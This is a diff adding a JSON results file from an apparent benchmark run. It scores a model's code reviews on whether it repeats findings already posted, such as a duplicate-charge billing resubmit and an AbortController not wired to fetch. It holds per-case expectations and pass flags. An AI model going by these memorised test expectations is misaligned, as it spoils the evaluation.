@@ -1,0 +1,4515 @@
+{
+  "model": "deepseek-v4-flash@fireworks",
+  "byokReasoning": "none",
+  "judge": "gemini-3-flash-preview",
+  "judgeReasoningEffort": null,
+  "reps": 5,
+  "engine": {
+    "commit": "7f04ea6a6bde3993a22103d32551e45f15da8e6b",
+    "sourceDigest": "65d8210f3d4ff1d5a5fa4e69740a3ec8f2c429d859a98bb946084efd8385a404"
+  },
+  "startedAt": "2026-10-15T00:56:00.251Z",
+  "updatedAt": "2026-10-15T01:56:24.817Z",
+  "complete": true,
+  "selectedCases": [
+    "R1-repeat-open",
+    "R7-refines-prior",
+    "R13-repeat-after-move",
+    "R17-repost-prod-profile",
+    "P05-rule-local-path-fixture-touched",
+    "P13-rule-log-operation-still-missing",
+    "P21-rule-unit-constants-out-of-40",
+    "P29-hold-leak-on-create",
+    "P37-markup-strip-new-sinks"
+  ],
+  "casesSourceDigest": "98d1fd1bf68c178621335afc77e3d6099a84ca33fa334c5fb1e4d8b02d9c83b3",
+  "summary": {
+    "measured": 45,
+    "infra": 0,
+    "problems": {
+      "unverified-shipped (#2040)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "repeat-of-sent": {
+        "n": 40,
+        "violations": 3,
+        "rate": 0.075
+      },
+      "revision-unlinked (#2039/#2020)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "refuted-shipped (control)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "true-bug-missed (guard)": {
+        "n": 20,
+        "violations": 1,
+        "rate": 0.05
+      },
+      "index-reference (#2039)": {
+        "n": 36,
+        "violations": 0,
+        "rate": 0
+      }
+    },
+    "byCase": {
+      "R1-repeat-open · resubmit-repeat [not_deliver, proposed]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "R7-refines-prior · signal-not-passed-repeat [not_deliver, proposed]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "R13-repeat-after-move · resubmit-repeat-moved [not_deliver]": {
+        "pass": 2,
+        "n": 5,
+        "delivered": 3
+      },
+      "R17-repost-prod-profile · await-sleep-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P05-rule-local-path-fixture-touched · local-path-fixture-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P05-rule-local-path-fixture-touched · local-path-fixture-new-site [deliver]": {
+        "pass": 4,
+        "n": 5,
+        "delivered": 4
+      },
+      "P13-rule-log-operation-still-missing · log-operation-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P13-rule-log-operation-still-missing · success-log-operation-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      },
+      "P21-rule-unit-constants-out-of-40 · avatar-size-literal-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P21-rule-unit-constants-out-of-40 · staging-retention-literal-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      },
+      "P29-hold-leak-on-create · book-hold-leak-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P37-markup-strip-new-sinks · chat-inbox-markup-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      }
+    }
+  },
+  "rows": [
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R1-repeat-open",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 58285,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: the NotReadyError branch still calls the non-idempotent `gw.submit(charge.payload)` on every poll tick (the line the new metric annotates), even though NotReadyError means the gateway already has the charge. WHY: `Gateway.submit` is documented as NOT idempotent (src/billing/gateway.ts:3-4) and NotReadyError is defined as 'the gateway has the charge but has not settled it yet' (src/billing/errors.ts:1-2), so each tick creates an additional duplicate charge — a real financial defect. HOW: wait for the existing charge to settle instead of resubmitting, e.g. `return { state: 'pending' as const };` on NotReadyError (the metrics.increment can stay), and let the next tick re-check status rather than creating a new charge.",
+          "keep": true,
+          "rationale": "Confirmed: errors.ts:1-2 defines NotReadyError as the gateway already holding the charge (transient), and gateway.ts:3 documents submit as NOT idempotent (each call creates a new charge). poller.ts:14-17 calls gw.submit on every NotReadyError tick, creating duplicate charges. The NotReadyError originates from gw.status in status.ts (re-thrown unchanged), i.e. the gateway already knows the charge, so resubmitting is wrong. The only contradicting element is the stale doc comment at poller.ts:6-9, which conflicts with the class definition and the throw site; it does not refute the defect. Previous decision was outcome not_implemented, which is not a rejection and does not excuse the bug.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/poller.ts",
+          "line": 15,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 17,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R1-repeat-open",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 59341,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: the NotReadyError branch (now instrumented at line 15) still resubmits the charge on every tick via gw.submit, which gateway.ts:3 documents as NOT idempotent ('every call creates a new charge'). WHY: if NotReadyError is returned for a charge the gateway already holds, each tick creates a duplicate charge rather than waiting for the existing one. HOW: increment the metric but wait/poll instead of resubmitting when the gateway already has the charge (or make submit idempotent with a client-generated idempotency key before calling it).",
+          "keep": true,
+          "rationale": "The finding's technical claim is factually supported. errors.ts:1 defines NotReadyError as \"The gateway has the charge but has not settled it yet (transient)\", i.e. the gateway already holds the charge. gateway.ts:3 documents submit as NOT idempotent (\"every call creates a new charge\"). fetchStatus (status.ts:8-9) re-throws NotReadyError unchanged, so the branch at poller.ts:14-17 is reached with a charge the gateway already has, and gw.submit(charge.payload) then creates a duplicate on every tick. The poller.ts:8 comment claiming the gateway \"never received it\" is the incorrect assumption; the authoritative error definition confirms the bug. Not refutable.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 40,
+                "path": "src/billing/errors.ts",
+                "startLine": 1
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 60,
+                "path": "src/billing/status.ts",
+                "startLine": 1
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/poller.ts",
+          "line": 14,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R1-repeat-open",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 71960,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: The NotReadyError branch still calls `await gw.submit(charge.payload)` even though NotReadyError means the gateway already holds the charge and `Gateway.submit` is documented as not idempotent. WHY: every tick re-submits an already-accepted charge, creating duplicate charges on the gateway; the newly added metric just counts these duplicate submissions. HOW: on NotReadyError, do not resubmit — return the transient/not-ready state (or rethrow) so the next tick re-polls status instead of creating a new charge.",
+          "keep": true,
+          "rationale": "Confirmed: errors.ts documents NotReadyError as \"The gateway has the charge but has not settled it yet (transient)\", and gateway.ts explicitly documents submit as \"NOT idempotent: every call creates a new charge.\" So the NotReadyError branch in poller.ts:14-17 resubmitting via gw.submit does create duplicate charges on each tick. The inline comment at poller.ts:8 (\"NotReadyError means the gateway never received it\") contradicts the authoritative error definition but does not make the resubmit correct. The prior review decision (round-a-resubmit) is not_implemented, which is not evidence of rejection. Root cause, failure path, and suggested fix all hold.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 80
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "class NotReadyError|NotReadyError|submit\\(",
+                "namesOnly": true
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/poller.ts",
+          "line": 15,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R1-repeat-open",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 77149,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: The new `metrics.increment('billing.resubmit')` is placed in the NotReadyError branch that still calls `await gw.submit(charge.payload)`, resubmitting a charge the gateway already holds (errors.ts:1 documents NotReadyError as \"The gateway has the charge but has not settled it yet\"). WHY: gw.submit is not idempotent, so on every tick where the gateway reports NotReady the charge is submitted again, producing duplicate charges and the metric simply counting them. HOW: Do not resubmit on NotReadyError; return a pending/not-ready state (or rethrow) and let the next tick re-check status instead. Also fix the stale comment at line 8, which claims NotReadyError means the gateway never received it.",
+          "keep": true,
+          "rationale": "The code confirms the claim: errors.ts documents NotReadyError as 'the gateway has the charge but has not settled it yet', gateway.ts explicitly marks submit as non-idempotent, yet poller.ts:14-17 resubmits on every NotReadyError tick, producing duplicate charges. The stale comment at line 8 corroborates the wrong assumption. The prior review entry is 'not_implemented', which is not evidence of rejection and does not warrant a drop.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError",
+                "glob": "*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/poller.ts",
+          "line": 15,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 18,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R1-repeat-open",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 67813,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/poller.ts",
+          "claim": "WHAT: The newly instrumented NotReadyError branch still calls `gw.submit(charge.payload)`, but `Gateway.submit` is documented as NOT idempotent (gateway.ts:3) while NotReadyError means the gateway already has the charge (errors.ts:1), so every tick that returns NotReadyError creates another duplicate charge. WHY: The added `metrics.increment('billing.resubmit')` merely counts these resubmits; it does not stop them, so the counter will grow in lockstep with duplicated charges (billing impact). HOW: Do not resubmit on NotReadyError — treat it as transient and wait/return a pending state (and rename the metric accordingly), e.g. `metrics.increment('billing.not_ready'); return { state: 'pending' as const };`.",
+          "keep": true,
+          "rationale": "Confirmed by code: errors.ts:1 defines NotReadyError as \"the gateway has the charge but has not settled it yet,\" and gateway.ts:3 states submit is \"NOT idempotent: every call creates a new charge.\" poller.ts:14-16 unconditionally calls gw.submit on every NotReadyError, so each tick creates a duplicate charge. The metric increment only counts resubmits, not prevents them. The claim's root cause, semantics, and failure path are all verified; nothing refutes it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/poller.ts",
+          "line": 15,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 17,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R7-refines-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 48038,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/http/client.ts",
+          "claim": "WHAT: The AbortController is created and aborted after 5s, but fetch is called as `fetch(url)` without passing `{ signal: controller.signal }`, so controller.abort() never affects the request. WHY: A server that never responds still hangs getJson forever — the timeout added to fix this is inert, and hung requests accumulate. HOW: pass the signal to fetch: `const res = await fetch(url, { signal: controller.signal });`.",
+          "keep": true,
+          "rationale": "src/http/client.ts line 5 calls `fetch(url)` with no options, while the AbortController created on line 2 is only aborted via setTimeout on line 3. Since the signal is never passed to fetch, controller.abort() cannot cancel the request, so the 5s timeout is inert and a server that never responds hangs getJson indefinitely. The root cause is factually correct and the failure path is reachable.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/http/client.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/http/client.ts",
+          "line": 2,
+          "label": "bug",
+          "earlierId": "round-a-http",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-http",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 7,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "signal-not-passed-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R7-refines-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 28236,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/http/client.ts",
+          "claim": "WHAT: The AbortController's signal is never passed to fetch — `fetch(url)` is called without `{ signal: controller.signal }`, so `controller.abort()` has no subscriber. WHY: The 5s timer fires and calls abort(), but because fetch is not wired to that signal the request is never cancelled and the caller still hangs forever, meaning the timeout added in this PR has no effect. HOW: pass the signal to fetch: `const res = await fetch(url, { signal: controller.signal });`.",
+          "keep": true,
+          "rationale": "Confirmed at src/http/client.ts:5: `fetch(url)` is called with no options object, so the AbortController's signal is never passed. The 5s `controller.abort()` therefore has no subscriber on the fetch call and cannot cancel the in-flight request. The AbortController added per the earlier review decision is ineffective as implemented, so the finding's technical claim holds.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/http/client.ts",
+                "startLine": 1,
+                "endLine": 25
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "getJson|fetch\\(",
+                "glob": "*.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/http/client.ts",
+          "line": 2,
+          "label": "bug",
+          "earlierId": "round-a-http",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-http",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 7,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "signal-not-passed-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R7-refines-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 29643,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/http/client.ts",
+          "claim": "WHAT: The added AbortController is never wired to the request — controller.abort() is called by the 5s timer, but fetch(url) is invoked without { signal: controller.signal }. WHY: abort() has no effect on a request that was not given the signal, so a server that never answers still hangs the caller indefinitely, meaning the timeout this change intends to add is a no-op (the exact failure it was meant to fix). HOW: pass the signal into fetch: `const res = await fetch(url, { signal: controller.signal });`.",
+          "keep": true,
+          "rationale": "Confirmed at src/http/client.ts: the AbortController is created (line 2) and aborted by the 5s timer (line 3), but fetch(url) on line 5 is invoked without { signal: controller.signal }. abort() cannot affect a request that was never given the signal, so the timeout does nothing and a non-responding server still hangs the caller — exactly the failure the change intended to fix. This is a concrete, verifiable defect, not style.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/http/client.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/http/client.ts",
+          "line": 2,
+          "label": "bug",
+          "earlierId": "round-a-http",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 8,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "signal-not-passed-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R7-refines-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 28778,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/http/client.ts",
+          "claim": "WHAT: The AbortController is created and `controller.abort()` is scheduled, but `fetch(url)` is called without `{ signal: controller.signal }`, so the abort is never attached to the request. WHY: The 5s timeout has no effect — a server that never responds still hangs the caller indefinitely, which is precisely the bug the timeout was added to fix. HOW: Pass the signal to fetch: `const res = await fetch(url, { signal: controller.signal });`.",
+          "keep": true,
+          "rationale": "Confirmed by reading src/http/client.ts:1-10. The AbortController is created (line 2) and a 5s timer aborts it (line 3), but fetch(url) at line 5 passes no options, so controller.signal is never attached to the request. The timeout therefore has no effect and a non-responding server still hangs the caller indefinitely. The root cause and failure path are factually accurate; nothing guards against it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/http/client.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/http/client.ts",
+          "line": 2,
+          "label": "bug",
+          "earlierId": "round-a-http",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-http",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 4,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": true,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "signal-not-passed-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R7-refines-prior",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 30536,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/http/client.ts",
+          "claim": "WHAT: the AbortController's signal is never passed to fetch — `fetch(url)` is called without `{ signal: controller.signal }`, so `controller.abort()` after 5s has no effect on the request. WHY: the timeout is a no-op and a server that never responds still hangs the caller indefinitely, which is the exact failure this change intended to fix. HOW: pass the signal to fetch: `const res = await fetch(url, { signal: controller.signal });`.",
+          "keep": true,
+          "rationale": "src/http/client.ts:2-9 creates an AbortController and schedules controller.abort() after 5000ms, but line 5 calls `fetch(url)` without passing `{ signal: controller.signal }`. Without the signal, controller.abort() does not cancel the in-flight fetch, so the timeout is a no-op and a non-responding server still hangs the caller. This is a concrete, verified behavior bug. Although the earlier review round marked the timeout suggestion as \"implemented,\" the current code shows the applied change is incomplete (signal never wired to fetch), so the finding stands rather than being refuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/http/client.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/http/client.ts",
+          "line": 2,
+          "label": "bug",
+          "earlierId": "round-a-http",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 9,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "signal-not-passed-repeat",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R13-repeat-after-move",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 89412,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/tick.ts",
+          "claim": "WHAT: on NotReadyError the code resubmits the charge via gw.submit(charge.payload), but gw.submit is explicitly not idempotent (gateway.ts:3-4) while NotReadyError means the gateway already has the charge and simply has not settled it yet (errors.ts:1-2). WHY: every tick for an accepted-but-unsettled charge creates an additional charge, producing duplicate/side-effect charges with financial impact. HOW: do not resubmit on NotReadyError; treat it as still pending (return a pending state or rethrow so the next tick re-checks status) and only submit when the gateway truly has no record of the charge.",
+          "keep": true,
+          "rationale": "Confirmed against source: gateway.ts:3-4 declares submit non-idempotent (\"every call creates a new charge\"), and errors.ts:1-2 defines NotReadyError as \"the gateway HAS the charge but has not settled it yet\". status.ts rethrows NotReadyError unchanged from gw.status, so tick.ts:13-15's resubmit via gw.submit(charge.payload) creates a duplicate charge on each tick for an accepted-but-unsettled charge. The tick.ts comment claiming \"the gateway never received it\" contradicts the authoritative error definition in errors.ts. The prior decision on this exact issue (round-a-resubmit) is outcome=not_implemented, which neither resolves nor excuses it. No guard upstream prevents the path; the bug is real.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/tick.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/tick.ts",
+          "line": 13,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
